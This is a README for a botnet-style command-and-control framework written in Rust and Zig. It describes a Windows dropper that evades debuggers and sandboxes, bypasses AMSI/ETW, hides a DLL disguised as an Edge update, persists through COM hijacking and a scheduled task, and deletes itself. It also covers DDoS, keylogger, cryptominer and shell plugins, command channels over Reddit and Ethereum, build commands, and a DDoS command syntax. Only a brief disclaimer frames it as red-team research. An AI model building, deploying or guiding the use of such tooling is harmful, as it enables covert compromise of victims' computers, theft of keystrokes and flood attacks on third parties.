# Pryzrak

> A distributed, resilient command-and-control framework with multi-platform support.

---

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Features](#features)
- [Quick Start](#quick-start)
- [Build Instructions](#build-instructions)
- [Operational Guide](#operational-guide)
- [Network Configuration](#network-configuration)
- [Project Structure](#project-structure)

---

## Overview

Pryzrak is a **two-tier distributed C2 framework** designed for resilience and stealth:

| Layer | Component | Purpose |
|-------|-----------|---------|
| **Control Plane** | Cloud Nodes (Zig) + Pryzrak (Rust) | P2P mesh, command signing, verification |
| **Execution Plane** | Edge Nodes (Rust) | Target agents, LAN clustering, task execution |

The **Pryzrak** node is the hidden master—indistinguishable from Cloud nodes in network traffic, but holds the private signing key.

---

## Architecture

```
                    ┌─────────────────────────────────────┐
                    │          CONTROL PLANE              │
                    │      Cloud P2P Mesh (UDP 31337)     │
                    │                                     │
                    │   Cloud ◄──► Cloud ◄──► PRYZRAK     │
                    │                           │         │
                    │                      SSH (12961)    │
                    │                           ▼         │
                    │                      [Operator]     │
                    └───────────────┬─────────────────────┘
                                    │ MQTT (1883)
                    ┌───────────────▼─────────────────────┐
                    │         EXECUTION PLANE             │
                    │       LAN Cluster (Edge Nodes)      │
                    │                                     │
                    │   Worker ◄──► LEADER ◄──► Worker    │
                    │              (TCP 31339)            │
                    └─────────────────────────────────────┘
```

See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for detailed technical design.

---

## Features

### Core System

| Category | Features |
|----------|----------|
| **Network** | P2P gossip mesh, LAN clustering, multi-cloud failover |
| **Security** | Ed25519 signed commands, rotating magic numbers, signature-only master |
| **Bootstrap** | 5-tier fallback: Cache → DNS-over-HTTPS → Reddit → DGA → Ethereum |
| **C2 Channels** | Reddit scraping + Sepolia smart contract polling |

### Windows Stealth (Edge Agent)

| Feature | Description |
|---------|-------------|
| **Dropper Architecture** | EXE drops DLL payload, establishes persistence, self-deletes |
| **COM Hijacking** | DLL registered as InprocServer32 for user-mode CLSID |
| **Scheduled Task** | Backup persistence via rundll32 |
| **Ghost Protocol** | AMSI/ETW bypass using indirect syscalls |
| **Anti-Analysis** | Debugger detection, sandbox checks, VM detection |
| **Sleep Obfuscation** | Memory encryption during sleep cycles (Ekko technique) |
| **Module Pinning** | DLL cannot be unloaded from host process |

### Plugins (Modular)

| Plugin | Capability |
|--------|------------|
| DDoS | UDP/TCP flood attacks |
| Cryptominer | CPU/GPU mining support |
| Keylogger | Keystroke capture |
| Shell | Remote command execution |

---

## Quick Start

### Prerequisites

- **Rust** 1.70+ (Pryzrak C2, Edge Agent)
- **Zig** 0.11+ (Cloud Nodes)
- **MinGW-w64** (Cross-compile Windows on Linux/Mac)

### Build Everything

```bash
# Clone repository
git clone https://github.com/your-org/pryzrak.git
cd pryzrak

# Build all components (uses build.sh script)
./build.sh
```

### Output Files

```
dist/
├── edge.dll           # Payload (2.7 MB) - Core logic
├── edge_dropper.exe   # Dropper (3.8 MB) - Embeds DLL, sets persistence
├── edge_debug.exe     # Debug version with console logs
├── c2_helper          # C2 command signing tool
└── log_viewer.exe     # Debug log viewer
```

---

## Build Instructions

### Two-Phase Build Process

The Windows agent uses a **two-phase build** to correctly embed the DLL payload:

```bash
# Phase 1: Build DLL (payload)
cargo build -p edge --lib --release --target x86_64-pc-windows-gnu

# Phase 2: Embed DLL into EXE (dropper)
cp target/x86_64-pc-windows-gnu/release/edge.dll crates/nodes/edge/src/assets/payload.dll
cargo build -p edge --bin edge --release --target x86_64-pc-windows-gnu
```

**Important**: The DLL must be built FIRST because it gets embedded into the EXE using `include_bytes!`.

### Debug Build

```bash
# Add debug_mode feature for console logs and IPC viewer
cargo build -p edge --features debug_mode --release --target x86_64-pc-windows-gnu
```

Debug mode enables:
- Console log output
- IPC daemon for log_viewer connection
- Bypasses certain anti-analysis checks

### Build Script

Use the automated `build.sh` script which handles both phases:

```bash
./build.sh
# Outputs:
# - dist/edge.dll (payload)
# - dist/edge_dropper.exe (dropper with embedded DLL)
# - dist/edge_debug.exe (debug version)
```

---

## Operational Guide

### Dropper Execution Flow

When `edge_dropper.exe` runs on target:

1. **Anti-Analysis** - Check for debuggers, sandboxes, VMs
2. **Ghost Protocol** - Bypass AMSI/ETW
3. **Drop Payload** - Extract embedded DLL to `%APPDATA%\Microsoft\OneDrive\EdgeUpdate.dll`
4. **Set Hidden Attributes** - Mark file as Hidden + System
5. **COM Hijacking** - Register DLL in registry (`HKCU\Software\Classes\CLSID\{...}\InprocServer32`)
6. **Scheduled Task** - Create backup persistence (`EdgeUpdateService`)
7. **Self-Delete** - Remove original EXE from disk
8. **Exit** - Process terminates; DLL activates on next COM usage

### DLL Activation

The DLL runs when:
- Windows loads the hijacked CLSID (automatic on Explorer startup)
- Scheduled task triggers rundll32

### Ghost Mode

Edge nodes start in **Ghost Mode** (silent):
- No P2P network activity
- Only polls Reddit/Sepolia for activation signal
- Activation switches to Active mode and enables P2P

### C2 Channels

| Channel | Method | Frequency |
|---------|--------|-----------|
| Reddit | Scrape subreddit for tagged posts | Every 5-30 min |
| Sepolia | Read smart contract storage | Every 5-30 min |

Commands are Ed25519 signed. Only properly signed commands are executed.

### Debug Commands

Run `log_viewer.exe` to connect to a running debug agent and view logs:

```bash
log_viewer.exe
# Shows real-time logs from edge_debug.exe
```

### C2 Shell Commands

| Command | Description | Example |
|---------|-------------|---------|
| `help` | List all commands | `help` |
| `.peers` | Show P2P mesh neighbors | `.peers` |
| `.count` | Estimate network size | `.count` |
| `.attack <ip> <port> <duration>` | DDoS command | `.attack 1.2.3.4 80 60` |

---

## Network Configuration

### Firewall Rules

| Direction | Port | Protocol | Purpose |
|-----------|------|----------|---------|
| **Inbound** | 31337 | UDP | Cloud P2P Mesh |
| **Inbound** | 12961 | TCP | Pryzrak Operator SSH |
| **Inbound** | 1883 | TCP | Cloud MQTT (Edge Listener) |
| **Outbound** | 80/443 | TCP | Edge C2 (DoH, Reddit, Fallback) |

### LAN Ports (Edge Cluster)

| Port | Protocol | Purpose |
|------|----------|---------|
| 31338 | UDP | Leader Election (Broadcast) |
| 31339 | TCP | Worker-Leader Bridge |
| 9631 | TCP | Zero-Noise Discovery Handshake |

---

## Project Structure

```
pryzrak/
├── crates/
│   ├── nodes/
│   │   ├── cloud/              # Cloud Relay (Zig)
│   │   ├── phantom/            # C2 Master (Rust)
│   │   └── edge/               # Stealth Agent (Rust)
│   │       ├── src/
│   │       │   ├── lib.rs          # Entry points (EXE/DLL)
│   │       │   ├── stealth/        # Evasion Engine
│   │       │   │   └── windows/
│   │       │   │       ├── mod.rs          # Anti-analysis, Ghost Protocol
│   │       │   │       ├── persistence.rs  # COM hijacking, Scheduled Task
│   │       │   │       ├── api_resolver.rs # Dynamic API resolution
│   │       │   │       ├── blinding.rs     # AMSI/ETW bypass
│   │       │   │       └── self_delete.rs  # Self-destruct
│   │       │   ├── assets/
│   │       │   │   ├── dropper.rs          # Dropper logic
│   │       │   │   ├── embedded_payload.rs # DLL embedding
│   │       │   │   └── payload.dll         # Embedded payload (build artifact)
│   │       │   ├── c2/             # Command & Control
│   │       │   │   ├── listener.rs     # Reddit/Sepolia polling
│   │       │   │   └── state.rs        # Ghost/Active mode
│   │       │   ├── discovery/      # Peer Discovery
│   │       │   │   ├── election.rs     # Leader election
│   │       │   │   ├── eth_listener.rs # Sepolia smart contract
│   │       │   │   └── zero_noise.rs   # Passive LAN discovery
│   │       │   └── plugins/        # Attack Modules
│   │       └── Cargo.toml
│   └── shared/                 # Cryptography & Protocol
├── tools/
│   ├── c2_helper/              # Command signing utility
│   ├── log_viewer/             # Debug log viewer
│   └── dns_signer/             # DNS record signing
├── smart_contracts/            # Sepolia dead-drop contract
├── docs/                       # Architecture Documentation
├── dist/                       # Build Artifacts
└── build.sh                    # Automated build script
```

---

## Security Considerations

### Cryptographic Primitives

| Component | Algorithm | Purpose |
|-----------|-----------|---------|
| Command Signing | Ed25519 | Only Pryzrak can issue commands |
| Magic Numbers | SHA256(date + seed) | Rotating identifiers |
| LIPC Framing | ChaCha20-Poly1305 | Worker-Leader encryption |

### Trust Hierarchy

1. **Pryzrak Node** - Holds private key, signs all commands
2. **Cloud Nodes** - Verify signatures, relay to Edge
3. **Edge Nodes** - Verify signatures, execute commands

---

## Disclaimer

**Authorized Research Only**. This software contains advanced evasion techniques (COM Hijacking, AMSI Bypass, Process Ghosting) designed for red team simulation. Misuse is illegal.
